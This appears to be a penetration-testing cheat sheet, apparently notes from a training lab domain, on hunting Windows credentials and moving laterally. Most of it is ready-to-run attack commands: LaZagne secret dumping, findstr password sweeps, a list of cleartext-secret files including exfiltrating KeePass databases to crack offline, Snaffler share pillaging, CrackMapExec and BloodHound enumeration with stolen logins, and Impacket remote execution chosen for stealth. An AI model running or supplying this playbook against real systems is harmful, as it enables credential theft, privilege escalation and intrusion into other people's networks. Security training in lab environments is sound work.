# Windows Credential Hunting (Pillaging)
**Concept:** Users leave secrets everywhere: Desktop files, browser caches, and configuration scripts. 
**Goal:** Find credentials to escalate privileges locally or move laterally to other machines.
## 1. Automated Discovery (LaZagne)
**Tool:** `LaZagne.exe` (Standalone Python-to-Exe) 
**Scope:** Browsers (Chrome/Firefox), Sysadmin tools (Putty/WinSCP), WiFi keys, and RDP history.
```powershell
# 1. Transfer lazagne.exe to target
# 2. Execute
.\lazagne.exe all

# Verbose mode (Debug if it fails)
.\lazagne.exe all -vv
```
## 2. Manual Search (The Power of `findstr`)
**Context:** Use native tools to search file contents for keywords. This is "Living Off The Land."
**Key Search Terms:**
- **Auth:** `Password`, `Passphrase`, `Key`, `Login`
- **Identity:** `Username`, `Creds`, `Secret`
- **Config:** `dbcredential`, `connectionString`
```powershell
# Recursive search for "password" in common file types
# /S: Subdirectories | /I: Case-insensitive | /M: Print filename only | /C: Literal string
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Search specific sensitive directory
cd C:\Users\Administrator\Documents
findstr /SIM /C:"password" *.*
```
## 3. High-Value Targets (Artifacts)
**Context:** Specific files known to contain cleartext secrets.

| **Artifact**       | **Path / Description**                                                  |
| -------------- | ------------------------------------------------------------------- |
| *Unattend.xml* | `C:\Windows\Panther\Unattend.xml` (Leftover install creds).         |
| *IIS Configs*  | `C:\inetpub\wwwroot\web.config` (Database connection strings).      |
| *Sysprep*      | `C:\Windows\System32\sysprep\sysprep.xml`                           |
| *Putty/WinSCP* | Registry: `HKCU\Software\SimonTatham\PuTTY\Sessions`                |
| *Sticky Notes* | `C:\Users\<User>\AppData\Local\Packages\...\LocalState\plum.sqlite` |
| *KeePass*      | Search for `*.kdbx` files. Exfiltrate and crack offline.            |
## 4. Snaffler (Network Share Pillaging)
**Tool:** `Snaffler.exe` **Role:** The ultimate tool for finding credentials in open SMB shares across the domain. It’s noisy but extremely effective.
```powershell
# Scan the domain for "candy" (credentials, SSH keys, configs)
# -s: Output to console | -v data: Verbose
.\Snaffler.exe -s -d INLANEFREIGHT.LOCAL -o snaffler.log -v data
```
# Credentialed Domain Enumeration (From Linux)
**Context:** You have extracted a valid username/password (or hash) and want to map the domain from your Kali machine.
## 1. CrackMapExec / NetExec
**Role:** The "Swiss Army Knife" for SMB/AD enumeration.
```shell
# Domain User Enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

# Logged On Users (Targeting Specific Host)
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

# Share Enumeration (Spidering)
# Spider_plus creates a JSON map of all files in shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
## 2. BloodHound (Python Ingestor)
**Role:** Visualizing AD relationships (Attack Paths).
```shell
# Collect data from the domain controller
# -c all: Collection method (Group, LocalAdmin, Session, Trusts)
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```
## 3. Impacket (Remote Execution)
**Role:** Executing commands if you have Admin creds.
```shell
# PsExec (SMB)
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125

# WMIExec (Stealthier)
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```
